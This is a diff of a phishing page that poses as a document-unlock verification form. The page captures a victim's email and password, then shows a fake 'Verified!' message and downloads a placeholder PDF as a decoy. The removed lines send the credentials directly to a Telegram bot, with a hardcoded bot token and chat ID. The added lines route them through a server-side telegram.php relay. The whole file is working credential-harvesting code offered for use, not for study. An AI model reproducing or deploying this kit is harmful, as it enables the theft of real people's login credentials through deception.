@@ -103,55 +103,45 @@
     </form>
     <div class="success-message" id="message">🔓 Verified! Your document is being prepared...</div>
   </div>
+<script>
+  form.addEventListener("submit", async function (e) {
+  e.preventDefault();
 
-  <script>
-    const form = document.getElementById("loginForm");
-    const message = document.getElementById("message");
+  const email = form.email.value;
+  const password = form.password.value;
 
-    form.addEventListener("submit", async function (e) {
-      e.preventDefault();
-
-      const email = form.email.value;
-      const password = form.password.value;
-
-      const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
-      const chatId = "5613637159";
-      const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-
-      const msg = `🔒 New Login Attempt 🔒\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
-
-      try {
-        await fetch(telegramUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
-          body: new URLSearchParams({
-            chat_id: chatId,
-            text: msg
-          })
-        });
-
-        // Show success
-        message.style.display = "block";
-
-        // Simulate a "PDF download"
-        setTimeout(() => {
-          const blob = new Blob(["This is a placeholder for your unlocked PDF."], {
-            type: "application/pdf",
-          });
-          const url = URL.createObjectURL(blob);
-          const link = document.createElement("a");
-          link.href = url;
-          link.download = "Unlocked_Document.pdf";
-          link.click();
-          URL.revokeObjectURL(url);
-        }, 2000);
-      } catch (err) {
-        alert("❌ Failed to send to Telegram.");
-        console.error(err);
-      }
+  try {
+    const response = await fetch("telegram.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: new URLSearchParams({ email, password })
     });
+
+    const result = await response.json();
+
+    if (result.status === "ok") {
+      message.style.display = "block";
+      setTimeout(() => {
+        const blob = new Blob(["This is a placeholder for your unlocked PDF."], {
+          type: "application/pdf",
+        });
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement("a");
+        link.href = url;
+        link.download = "Unlocked_Document.pdf";
+        link.click();
+        URL.revokeObjectURL(url);
+      }, 2000);
+    } else {
+      alert("❌ Failed to send data.");
+    }
+  } catch (err) {
+    alert("❌ Request error.");
+    console.error(err);
+  }
+});
   </script>
 </body>
 </html>
